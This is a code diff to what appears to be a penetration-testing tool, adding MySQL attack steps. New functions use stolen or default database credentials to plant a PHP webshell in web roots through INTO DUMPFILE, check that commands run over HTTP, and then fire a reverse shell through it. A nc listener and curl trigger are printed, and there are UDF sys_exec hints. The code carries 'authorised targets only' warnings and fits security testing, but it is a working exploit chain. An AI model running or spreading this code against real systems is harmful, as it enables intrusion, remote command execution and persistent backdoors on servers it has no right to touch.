@@ -2290,6 +2290,22 @@ def _extract_finding(sid: str, output: str) -> "dict | None":
                     "summary": f"telnet foothold — {mm.group(1).strip()}"[:140]}
         return None
 
+    # 2bl) mysql-shell: a reverse shell was fired through the OUTFILE webshell
+    if sid == "mysql-shell":
+        if "shell → " in output:
+            mm = re.search(r"shell → (.+)$", output, re.M)
+            return {"state": "VULNERABLE", "cve": cve, "risk": "CRITICAL",
+                    "summary": f"MySQL foothold — {mm.group(1).strip()}"[:140]}
+        return None
+
+    # 2bk) mysql-rce: INTO OUTFILE webshell → confirmed command execution
+    if sid == "mysql-rce":
+        if re.search(r"^✗ RCE ", output, re.M):
+            mu = re.search(r"^✗ RCE (\S+)", output, re.M)
+            return {"state": "VULNERABLE", "cve": cve, "risk": "CRITICAL",
+                    "summary": f"MySQL RCE: webshell {mu.group(1)}"[:140]}
+        return None
+
     # 2bj) mysql-loot: app creds > user hashes / file-read > db inventory
     if sid == "mysql-loot":
         appc = re.findall(r"^✗ CRED (.+)$", output, re.M)
@@ -3369,8 +3385,7 @@ _EXPLOIT_STEPS = {
         ("Banner: handshake → version + auth plugin → searchsploit", "mysql-banner"),
         ("Root no-pass + default / reused creds; CVE-2012-2122 bypass on old 5.x", "mysql-creds"),
         ("Loot: DBs/users, mysql.user hashes, app creds, LOAD_FILE", "mysql-loot"),
-        "Write a webshell with INTO OUTFILE into a writable web root",
-        "UDF (lib_mysqludf_sys) for OS command execution if the plugin dir is writable",
+        ("RCE: INTO OUTFILE webshell (FILE priv, exec-verified); UDF guidance", "mysql-rce"),
         "Manual steps & further research",
     ],
     "mssql": [
@@ -12889,6 +12904,146 @@ def _tool_mysql_loot(ip: str, port: int, proto: str) -> str:
     return f"MySQL loot — {ip}:{port}\n\n" + "\n".join(lines)
 
 
+# ── MySQL step 4: RCE — INTO OUTFILE webshell (FILE priv), UDF guidance ────────
+_MYSQLRCE_DEADLINE = 90
+_MYSQL_HTTP_PORTS = {80, 443, 8080, 8000, 8443, 8888, 5000, 3000}
+_MYSQL_WEBROOTS = ["/var/www/html", "/var/www", "/usr/share/nginx/html", "/srv/http",
+                   "/var/www/htdocs", "/app/public", "/var/www/html/uploads"]
+
+
+def _tool_mysql_rce(ip: str, port: int, proto: str) -> str:
+    """MySQL step 4 tool: with a FILE-privileged cred, drop a PHP webshell into a served web root
+    via SELECT … INTO DUMPFILE and exec-verify it over HTTP with a computed marker (real command
+    execution). Reports the working webshell URL (spawn a reverse shell via spawn-shell r1). SQL
+    can't delete files, so any drop is left on disk and reported for manual cleanup. UDF RCE stays
+    manual (arch-specific .so). Needs a stored cred + mysql client. Authorised targets only."""
+    import time
+    import os
+    import urllib.parse
+    creds = _gather_mysql_creds(ip)
+    if not creds:
+        raise RuntimeError("no MySQL creds — run mysql-creds (r2) first")
+    if not (shutil.which("mysql") or shutil.which("mariadb")):
+        raise RuntimeError("mysql/mariadb client required for RCE (OUTFILE writes)")
+    user = pw = None
+    for u, p in creds:
+        rc, _o = _mysql_query(ip, port, u, p, "SELECT 1")
+        if rc == 0:
+            user, pw = u, p
+            break
+    if user is None:
+        raise RuntimeError("stored MySQL creds no longer authenticate — re-run mysql-creds (r2)")
+
+    def q(sql, t=15):
+        return _mysql_query(ip, port, user, pw, sql, timeout=t)
+
+    _rc, sfpout = q("SELECT IFNULL(@@secure_file_priv,'NULL')")
+    sfp = sfpout.strip()
+    _rc, grants = q("SHOW GRANTS")
+    file_priv = bool(re.search(r"\bFILE\b|ALL PRIVILEGES", grants or ""))
+
+    lines = [f"[*] FILE priv: {'yes' if file_priv else 'no'} · secure_file_priv: {sfp or '(empty)'}"]
+    rce, written = [], []
+    if file_priv and sfp == "":
+        deadline = time.time() + _MYSQLRCE_DEADLINE
+        http_ports = [p for p, pr, _s in fetch_ports(ip) if p in _MYSQL_HTTP_PORTS and pr == "tcp"] or [80]
+        payload = b"<?php system($_GET['c']); ?>"
+        for wr in _MYSQL_WEBROOTS:
+            if time.time() > deadline or rce:
+                break
+            name = f"pshm_{os.urandom(3).hex()}.php"
+            path = f"{wr}/{name}"
+            rc, _o = q("SELECT UNHEX('%s') INTO DUMPFILE '%s'" % (payload.hex(), path))
+            if rc != 0:
+                continue
+            written.append(path)
+            for hp in http_ports:
+                tls = hp in (443, 8443)
+                mark = f"PSH{os.urandom(2).hex()}"
+                probe = urllib.parse.quote(f"echo {mark}$((6*7))")
+                body = _http_get(ip, hp, f"/{name}?c={probe}", tls)
+                if body and f"{mark}42" in body:
+                    rce.append((f"{'https' if tls else 'http'}://{ip}:{hp}/{name}", path))
+                    break
+
+    for url, path in rce:
+        lines.append(f"✗ RCE {url} (php system())")
+    for path in written:
+        if not any(path == pp for _u, pp in rce):
+            lines.append(f"⚠ dropped but not served: {path} — rm it manually (SQL can't delete)")
+    for _u, path in rce:
+        lines.append(f"⚠ webshell left on disk: {path} — rm it manually (SQL can't delete)")
+    if rce:
+        lines.append("· spawn a reverse shell: Privilege Escalation phase → spawn-shell (r1)")
+    else:
+        if not file_priv:
+            lines.append("· no FILE privilege — OUTFILE RCE unavailable with this cred")
+        elif sfp != "":
+            lines.append(f"· secure_file_priv={sfp or 'NULL'} blocks arbitrary OUTFILE — RCE limited")
+        else:
+            lines.append("· FILE priv ok but no writable+served web root hit — try a known web root")
+        lines.append("· UDF RCE (manual): INTO DUMPFILE lib_mysqludf_sys.so → @@plugin_dir → "
+                     "CREATE FUNCTION sys_exec … SONAME 'lib_mysqludf_sys.so' → sys_exec('cmd')")
+    return f"MySQL RCE — {ip}:{port}\n\n" + "\n".join(lines)
+
+
+def _tool_mysql_shell(ip: str, port: int, proto: str) -> str:
+    """MySQL foothold (INTERACTIVE): fire a reverse shell through the webshell mysql-rce confirmed —
+    smart auto-upgrading listener on a free local port, then trigger via HTTP (with retries).
+    Headless prints the curl. Authorised targets only."""
+    import time
+    import tempfile
+    import urllib.parse
+    rout = next((o for s, o in fetch_scripts(ip, port, proto) if s == "mysql-rce"), "")
+    mu = re.search(r"^✗ RCE (\S+)", rout, re.M)
+    if not mu:
+        print(f"\n{YELLOW}no confirmed MySQL webshell{RESET} — run {BOLD}mysql-rce (r4){RESET} first.")
+        return "mysql-shell: no confirmed webshell (run mysql-rce r4)"
+    url = mu.group(1)
+    mm = re.match(r"(https?)://([^:/]+):?(\d+)?(/.*)$", url)
+    if not mm:
+        return "mysql-shell: could not parse the webshell URL"
+    scheme, host, hp, path = mm.group(1), mm.group(2), mm.group(3), mm.group(4)
+    tls = scheme == "https"
+    web_port = int(hp) if hp else (443 if tls else 80)
+    lhost = _foothold_lhost(ip)
+    if not lhost:
+        print(f"{RED}✗ could not determine our IP toward {ip}{RESET}")
+        return "mysql-shell: no LHOST"
+    lport = _free_local_port(4444)
+    if lport != 4444:
+        print(f"{YELLOW}port 4444 in use{RESET}{DIM} — using {BOLD}{lport}{RESET}{DIM} for the listener{RESET}")
+    rlabel, _n, rtpl, rpty = _REVSHELLS[0]
+    revsh = rtpl.replace("{ip}", lhost).replace("{port}", str(lport))
+    path_q = f"{path}?c={urllib.parse.quote(revsh)}"
+    upgrade = b"" if rpty else _FOOTHOLD_UPGRADE.encode()
+    src = (_SMART_LISTENER_SRC.replace("__LPORT__", str(lport)).replace("__UPGRADE__", repr(upgrade)))
+    fd, spath = tempfile.mkstemp(prefix="pshunter_listener_", suffix=".py")
+    with os.fdopen(fd, "w") as fh:
+        fh.write(src)
+    used = _open_listener_terminal(spath)
+
+    def _fire():
+        try:
+            _http_get(ip, web_port, path_q, tls)
+        except Exception:                                    # noqa: BLE001
+            pass
+
+    if not used:
+        _safe_unlink(spath)
+        print(f"{YELLOW}headless{RESET} — start {BOLD}nc -lvnp {lport}{RESET}, then fire:\n  "
+              f"{BOLD}curl '{url}?c=<url-encoded reverse shell>'{RESET}")
+        return f"mysql-shell: headless — webshell {url}"
+    print(f"{GREEN}▶ smart listener opened{RESET} {DIM}({used}) on {lhost}:{lport}{RESET}")
+    time.sleep(1.5)
+    for _ in range(3):
+        _fire()
+        time.sleep(1.0)
+    print(f"  {DIM}→ check the new terminal for your {GREEN}shell{RESET}{DIM}; "
+          f"if nothing landed, re-fire the curl{RESET}")
+    return f"mysql-shell: web-rce shell → {lhost}:{lport} (via {url})"
+
+
 # ══ Privilege Escalation phase 1: spawn a shell ══ one place to land a foothold, whatever the
 # service surfaced. A router: it detects which of this host's services have a viable path to a
 # shell (from findings already in the DB) and dispatches to that service's existing foothold tool
@@ -12924,6 +13079,10 @@ def _spawn_shell_paths(ip: str) -> list:
         if noauth or creds:
             detail = ("auto-login (proven cred)" if creds else "unauthenticated shell (no creds)")
             paths.append(("Telnet", detail, "telnet-shell", p, pr))
+    for p, pr in by_key.get("mysql", []):
+        rce = next((o for s, o in fetch_scripts(ip, p, pr) if s == "mysql-rce"), "")
+        if "✗ RCE " in rce:
+            paths.append(("MySQL", "reverse shell via the INTO OUTFILE webshell", "mysql-shell", p, pr))
     return paths
 
 
@@ -13030,6 +13189,8 @@ _STEP_TOOLS = {
     "mysql-banner": ("MySQL/MariaDB handshake → version + auth plugin → searchsploit (stdlib)", _tool_mysql_banner),
     "mysql-creds": ("root no-pass + default/reused creds; CVE-2012-2122 bypass (mysql CLI / netexec)", _tool_mysql_creds),
     "mysql-loot": ("dump DBs/users, mysql.user hashes, app creds, LOAD_FILE (mysql CLI, read-only)", _tool_mysql_loot),
+    "mysql-rce": ("INTO OUTFILE webshell → exec-verified RCE (FILE priv); UDF guidance", _tool_mysql_rce),
+    "mysql-shell": ("MySQL foothold → reverse shell via the OUTFILE webshell (spawned)", _tool_mysql_shell),
     "spawn-shell": ("spawn a shell — router across all service footholds (interactive)", _tool_spawn_shell),
 }
 
@@ -13115,6 +13276,8 @@ _STEP_TOOL_RUNS = {
     "mysql-banner":     ("Python (stdlib) + searchsploit", None),
     "mysql-creds":      ("mysql CLI / netexec", f"{_mins(_MYSQLCREDS_DEADLINE)} min"),
     "mysql-loot":       ("mysql CLI", f"{_mins(_MYSQLLOOT_DEADLINE)} min"),
+    "mysql-rce":        ("mysql CLI + HTTP verify", f"{_mins(_MYSQLRCE_DEADLINE)} min"),
+    "mysql-shell":      ("Python (smart listener)", None),
     "spawn-shell":      ("router → service foothold", None),
 }
 
@@ -13297,6 +13460,11 @@ def _run_step_tool(ip: str, target: tuple, n: int) -> None:
         print(f"{YELLOW}   ⚠ WRITES to the target{RESET}{DIM} — uploads a throwaway {BOLD}~pshw_*{RESET}"
               f"{DIM} via WRQ, reads it back, then blanks it to 0 bytes. "
               f"{RESET}{YELLOW}TFTP has no DELETE — the file stays; clean up manually{RESET}"
+              f"{DIM} · authorised targets only{RESET}")
+    if tool_key == "mysql-rce":                   # WRITES a webshell — SQL can't delete it
+        print(f"{YELLOW}   ⚠ WRITES a webshell{RESET}{DIM} — SELECT … INTO DUMPFILE a PHP shell into "
+              f"common web roots, exec-verifies over HTTP. "
+              f"{RESET}{YELLOW}SQL can't delete files — the shell stays; clean up manually{RESET}"
               f"{DIM} · authorised targets only{RESET}")
     if tool_key == "mysql-creds":                 # targeted creds; bypass loop only when flagged
         print(f"{DIM}   targeted default/reused logins via mysql CLI / netexec (not a wordlist brute). "
